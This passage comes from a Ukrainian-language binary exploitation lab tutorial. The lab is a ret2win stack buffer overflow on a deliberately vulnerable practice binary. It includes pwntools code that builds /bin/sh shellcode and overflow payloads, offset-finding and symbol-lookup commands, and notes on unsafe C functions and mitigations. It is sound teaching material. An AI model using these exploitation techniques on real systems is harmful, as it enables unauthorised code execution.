# –ì–µ–Ω–µ—Ä—É—î–º–æ shellcode –¥–ª—è execve("/bin/sh")
shellcode = asm(shellcraft.sh())
print(f"Shellcode: {len(shellcode)} –±–∞–π—Ç")

io = process('../build/stage06_ret2win')

# –ö–ª–∞–¥–µ–º–æ shellcode –≤ –±—É—Ñ–µ—Ä, —Å—Ç—Ä–∏–±–∞—î–º–æ –Ω–∞ –Ω—å–æ–≥–æ
# –ü–æ—Ç—Ä—ñ–±–Ω–∞ –∞–¥—Ä–µ—Å–∞ –±—É—Ñ–µ—Ä–∞ (—Å–∫–ª–∞–¥–Ω–æ –±–µ–∑ leak, –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü—ñ—ó)
# –ü—Ä–æ—Å—Ç—ñ—à–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–∞—Ç–∏ win(), –∞–ª–µ —Ü–µ –ø–æ–∫–∞–∑—É—î –º–æ–∂–ª–∏–≤—ñ—Å—Ç—å

io.sendlineafter(b'name\n', b'A' * 72 + p64(0xdeadbeef))  # –ó–∞–≥–ª—É—à–∫–∞
io.close()

print("[!] –¶–µ –∑–∞–≤–¥–∞–Ω–Ω—è —Å–∫–ª–∞–¥–Ω—ñ—à–µ - –ø–æ—Ç—Ä—ñ–±–Ω–∞ –∞–¥—Ä–µ—Å–∞ —Å—Ç–µ–∫—É")
print("[!] –£ stage 07 –≤–∏ –Ω–∞–≤—á–∏—Ç–µ—Å—è –≤–∏—Ç—è–≥—É–≤–∞—Ç–∏ –∞–¥—Ä–µ—Å–∏")
```

## üí° –ü–æ—Ä—ñ–≤–Ω—è–Ω–Ω—è –∑ –ø–æ–ø–µ—Ä–µ–¥–Ω—ñ–º–∏ –µ—Ç–∞–ø–∞–º–∏

| –ê—Å–ø–µ–∫—Ç | Stage 04 | Stage 05 | Stage 06 |
|--------|----------|----------|----------|
| –í—Ä–∞–∑–ª–∏–≤—ñ—Å—Ç—å | –ü—Ä—è–º–µ —á–∏—Ç–∞–Ω–Ω—è | –°–∏–º—É–ª—è—Ü—ñ—è BOF | **–°–ø—Ä–∞–≤–∂–Ω—ñ–π BOF** |
| –í–∏–∫–ª–∏–∫ —Ü—ñ–ª—ñ | `fp()` —è–≤–Ω–æ | `fp()` —è–≤–Ω–æ | `return` –Ω–µ—è–≤–Ω–æ |
| –ü—ñ–¥–∫–∞–∑–∫–∏ | –ù–µ–º–∞—î | NEED=N | **–ù–µ–º–∞—î** |
| Offset | –ù–µ –ø–æ—Ç—Ä—ñ–±–µ–Ω | 72 (–¥–∞–Ω–∏–π) | 72 (—Ç—Ä–µ–±–∞ –∑–Ω–∞–π—Ç–∏) |
| –†–µ–∞–ª—ñ—Å—Ç–∏—á–Ω—ñ—Å—Ç—å | ‚≠ê‚òÜ‚òÜ‚òÜ‚òÜ | ‚≠ê‚≠ê‚òÜ‚òÜ‚òÜ | **‚≠ê‚≠ê‚≠ê‚≠ê‚òÜ** |

## üîê –ü–æ—à–∏—Ä–µ–Ω—ñ –≤—Ä–∞–∑–ª–∏–≤–æ—Å—Ç—ñ BOF

### 1. –ù–µ–±–µ–∑–ø–µ—á–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó

```c
// ‚ùå –ù–ï–ë–ï–ó–ü–ï–ß–ù–Ü (–Ω–µ –ø–µ—Ä–µ–≤—ñ—Ä—è—é—Ç—å —Ä–æ–∑–º—ñ—Ä):
gets(buf);                    // –ù—ñ–∫–æ–ª–∏ –Ω–µ –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–π—Ç–µ!
scanf("%s", buf);             // –¢–µ–∂ –Ω–µ–±–µ–∑–ø–µ—á–Ω–æ
strcpy(dest, src);            // –Ø–∫—â–æ src –¥–æ–≤—à–µ dest
strcat(dest, src);            // –¢–µ–∂ –º–æ–∂–µ –ø–µ—Ä–µ–ø–æ–≤–Ω–∏—Ç–∏

// ‚ö†Ô∏è –ü–û–¢–ï–ù–¶–Ü–ô–ù–û –ù–ï–ë–ï–ó–ü–ï–ß–ù–Ü:
read(0, buf, 256);            // –Ø–∫—â–æ buf < 256
recv(sock, buf, 1024, 0);     // –Ø–∫—â–æ buf < 1024

// ‚úÖ –ë–ï–ó–ü–ï–ß–ù–Ü:
fgets(buf, sizeof(buf), stdin);        // –û–±–º–µ–∂—É—î —Ä–æ–∑–º—ñ—Ä
snprintf(buf, sizeof(buf), "%s", src); // –û–±–º–µ–∂—É—î —Ä–æ–∑–º—ñ—Ä
strncpy(dest, src, sizeof(dest));      // –û–±–º–µ–∂—É—î (–∞–ª–µ –º–∞—î –Ω—é–∞–Ω—Å–∏)
```

### 2. –†–µ–∞–ª—å–Ω—ñ CVE –ø—Ä–∏–∫–ª–∞–¥–∏

**CVE-2014-0160 (Heartbleed):**
```c
// –°–ø—Ä–æ—â–µ–Ω–∏–π –ø—Ä–∏–∫–ª–∞–¥
void heartbeat(int payload_length, char *payload) {
    char buffer[100];
    // ‚ùå payload_length –º–æ–∂–µ –±—É—Ç–∏ –±—ñ–ª—å—à–µ 100!
    memcpy(buffer, payload, payload_length);
    send(buffer, payload_length);  // –í—ñ–¥–ø—Ä–∞–≤–ª—è—î –ø–∞–º'—è—Ç—å –ø–æ–∑–∞ –±—É—Ñ–µ—Ä–æ–º
}
```

**CVE-2020-1350 (SIGRed - Windows DNS):**
–ü–µ—Ä–µ–ø–æ–≤–Ω–µ–Ω–Ω—è –±—É—Ñ–µ—Ä–∞ —á–µ—Ä–µ–∑ –Ω–µ–ø—Ä–∞–≤–∏–ª—å–Ω—É –æ–±—Ä–æ–±–∫—É DNS –∑–∞–ø–∏—Å—ñ–≤.

### 3. –ó–∞—Ö–∏—Å—Ç–∏ —É —Ä–µ–∞–ª—å–Ω–æ–º—É —Å–≤—ñ—Ç—ñ

–°—É—á–∞—Å–Ω—ñ –ø—Ä–æ–≥—Ä–∞–º–∏ –º–∞—é—Ç—å –∑–∞—Ö–∏—Å—Ç–∏:

```
–¢–∏–ø–æ–≤–∞ –ø—Ä–æ–≥—Ä–∞–º–∞ 2024:
‚úÖ Canary         - –¥–µ—Ç–µ–∫—Ç—É—î BOF
‚úÖ NX             - –±–ª–æ–∫—É—î shellcode
‚úÖ PIE + ASLR     - —Ä–∞–Ω–¥–æ–º—ñ–∑—É—î –∞–¥—Ä–µ—Å–∏
‚úÖ Full RELRO     - –∑–∞—Ö–∏—â–∞—î GOT
‚úÖ FORTIFY_SOURCE - –ø–µ—Ä–µ–≤—ñ—Ä—è—î —Ä–æ–∑–º—ñ—Ä–∏ –Ω–∞ –µ—Ç–∞–ø—ñ –∫–æ–º–ø—ñ–ª—è—Ü—ñ—ó
```

–ù–∞—à–µ –∑–∞–≤–¥–∞–Ω–Ω—è:
```
Stage 06 (–Ω–∞–≤—á–∞–ª—å–Ω–µ):
‚ùå No Canary      - BOF –º–æ–∂–ª–∏–≤–∏–π
‚ùå NX disabled    - –º–æ–∂–Ω–∞ shellcode (–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ)
‚ùå No PIE         - –∞–¥—Ä–µ—Å–∏ —Ñ—ñ–∫—Å–æ–≤–∞–Ω—ñ
‚ùå No RELRO       - GOT –≤—Ä–∞–∑–ª–∏–≤–∏–π (–Ω–µ –ø–æ—Ç—Ä—ñ–±–Ω–æ)
```

## üìö –ù–∞—Å—Ç—É–ø–Ω—ñ –∫—Ä–æ–∫–∏

### –©–æ –¥–∞–ª—ñ?

**Stage 07 - Leak demo:**
- –í–≤—ñ–º–∫–Ω–µ–º–æ **NX**
- –î–æ–¥–∞–º–æ –º–µ—Ö–∞–Ω—ñ–∑–º **–≤–∏—Ç–æ–∫—É –∞–¥—Ä–µ—Å**
- –ù–∞–≤—á–∏–º–æ—Å—è –æ–±—Ö–æ–¥–∏—Ç–∏ **ASLR**

**Stage 08 - ret2libc:**
- –ü–æ–≤–Ω–æ—Ü—ñ–Ω–Ω–∏–π **ROP chain**
- –í–∏–∫–ª–∏–∫ `system("/bin/sh")`
- –¢–µ—Ö–Ω—ñ–∫–∞ **ORW** (Open-Read-Write)

### –î–æ–¥–∞—Ç–∫–æ–≤–µ —á–∏—Ç–∞–Ω–Ω—è

- [Smashing The Stack For Fun And Profit](http://phrack.org/issues/49/14.html) - –∫–ª–∞—Å–∏—á–Ω–∞ —Å—Ç–∞—Ç—Ç—è 1996 —Ä–æ–∫—É
- [Modern Binary Exploitation](https://github.com/RPISEC/MBE) - –∫—É—Ä—Å RPI
- [pwn.college](https://pwn.college/) - —ñ–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω–µ –Ω–∞–≤—á–∞–Ω–Ω—è
- [ROP Emporium](https://ropemporium.com/) - –ø—Ä–∞–∫—Ç–∏–∫–∞ ROP

## üêõ Debugging –ø—ñ–¥–∫–∞–∑–∫–∏

### –ü—Ä–æ–≥—Ä–∞–º–∞ –∫—Ä–∞—à–∏—Ç—å –∑–∞–º—ñ—Å—Ç—å win()?

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ offset:**
```bash
python3 -c "from pwn import *; print(cyclic(100))" | ../build/stage06_ret2win
dmesg | tail  # –ü–æ–¥–∏–≤—ñ—Ç—å—Å—è –∞–¥—Ä–µ—Å—É –∫—Ä–∞—à–∞
```

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –∞–¥—Ä–µ—Å—É win():**
```bash
objdump -d ../build/stage06_ret2win | grep '<win>'
nm ../build/stage06_ret2win | grep win
```

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ payload:**
```python
payload = b'A' * 72 + p64(win_addr)
print(f"Length: {len(payload)}")      # –ú–∞—î –±—É—Ç–∏ 80
print(f"Last 8 bytes: {payload[-8:].hex()}")  # –ú–∞—î –±—É—Ç–∏ –∞–¥—Ä–µ—Å–∞ win
```

### –ù–µ–º–∞—î –≤–∏–≤–æ–¥—É –ø—Ä–∞–ø–æ—Ä–∞?

**–ü–µ—Ä–µ–≤—ñ—Ä—Ç–µ –±—É—Ñ–µ—Ä–∏–∑–∞—Ü—ñ—é:**
```c
setbuf(stdout, NULL);  // –ú–∞—î –±—É—Ç–∏ –≤ –∫–æ–¥—ñ
```

**–î–æ–¥–∞–π—Ç–µ –≤ exploit:**
```python
io.sendline(payload)
time.sleep(0.5)        # –î–∞–π—Ç–µ —á–∞—Å –Ω–∞ –æ–±—Ä–æ–±–∫—É
print(io.recvall(timeout=2).decode())
```

## ‚úÖ –ß–µ–∫–ª–∏—Å—Ç –≤–∏–∫–æ–Ω–∞–Ω–Ω—è

- [ ] –ó—ñ–±—Ä–∞–Ω–æ –±—ñ–Ω–∞—Ä–Ω–∏–∫ —á–µ—Ä–µ–∑ `build.sh`
- [ ] –ü–µ—Ä–µ–≤—ñ—Ä–µ–Ω–æ —â–æ –≤—Å—ñ –∑–∞—Ö–∏—Å—Ç–∏ –≤–∏–º–∫–Ω–µ–Ω—ñ (checksec)
- [ ] –ó–Ω–∞–π–¥–µ–Ω–æ –∞–¥—Ä–µ—Å—É win() —á–µ—Ä–µ–∑ objdump –∞–±–æ pwntools
- [ ] –ó—Ä–æ–∑—É–º—ñ–≤ –º–µ—Ö–∞–Ω—ñ–∑–º —Å–ø—Ä–∞–≤–∂–Ω—å–æ–≥–æ BOF
- [ ] –°—Ç–≤–æ—Ä–∏–≤ —Ä–æ–±–æ—á–∏–π exploit –∑ offset=72
- [ ] –û—Ç—Ä–∏–º–∞–≤ –ø—Ä–∞–ø–æ—Ä FLAG{STAGE6_RET2WIN}
- [ ] –ï–∫—Å–ø–µ—Ä–∏–º–µ–Ω—Ç—É–≤–∞–≤ –∑ —Ä—ñ–∑–Ω–∏–º–∏ offset
- [ ] –ó—Ä–æ–∑—É–º—ñ–≤ —è–∫ return –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É—î saved RIP
- [ ] –ó–Ω–∞—é –Ω–µ–±–µ–∑–ø–µ—á–Ω—ñ —Ñ—É–Ω–∫—Ü—ñ—ó (gets, strcpy, etc)
- [ ] –ì–æ—Ç–æ–≤–∏–π –¥–æ Stage 07 (leak + ASLR)!

---

**–ß–∞—Å –≤–∏–∫–æ–Ω–∞–Ω–Ω—è:** 20-30 —Ö–≤–∏–ª–∏–Ω
**–°–∫–ª–∞–¥–Ω—ñ—Å—Ç—å:** ‚≠ê‚≠ê‚≠ê‚òÜ‚òÜ (–°–µ—Ä–µ–¥–Ω—è)
**–ö–∞—Ç–µ–≥–æ—Ä—ñ—è:** PWN / Buffer Overflow
**–ö–ª—é—á–æ–≤—ñ –ø–æ–Ω—è—Ç—Ç—è:** BOF, saved RIP, return hijacking, ret2win
**CVE –∞–Ω–∞–ª–æ–≥–∏:** CVE-2014-0160, CVE-2020-1350 —Ç–∞ —Ç–∏—Å—è—á—ñ —ñ–Ω—à–∏—Ö

## üéâ –í—ñ—Ç–∞—î–º–æ!

–í–∏ —â–æ–π–Ω–æ –µ–∫—Å–ø–ª—É–∞—Ç—É–≤–∞–ª–∏ **—Å–ø—Ä–∞–≤–∂–Ω—ñ–π buffer overflow**! –¶–µ —Ñ—É–Ω–¥–∞–º–µ–Ω—Ç–∞–ª—å–Ω–∞ —Ç–µ—Ö–Ω—ñ–∫–∞ –≤ binary exploitation. –í—Å—ñ —Å–∫–ª–∞–¥–Ω—ñ—à—ñ –∞—Ç–∞–∫–∏ (ROP, ret2libc) –±–∞–∑—É—é—Ç—å—Å—è –Ω–∞ —Ü—ñ–π –∫–æ–Ω—Ü–µ–ø—Ü—ñ—ó.

**–ù–∞—Å—Ç—É–ø–Ω–∏–π –≤–∏–∫–ª–∏–∫:** –£ Stage 07 —ñ 08 –¥–æ–¥–∞–¥—É—Ç—å—Å—è –∑–∞—Ö–∏—Å—Ç–∏ (NX, ASLR), —ñ –¥–æ–≤–µ–¥–µ—Ç—å—Å—è –≤–∏–∫–æ—Ä–∏—Å—Ç–æ–≤—É–≤–∞—Ç–∏ –ø—Ä–æ—Å—É–Ω—É—Ç—ñ—à—ñ —Ç–µ—Ö–Ω—ñ–∫–∏!
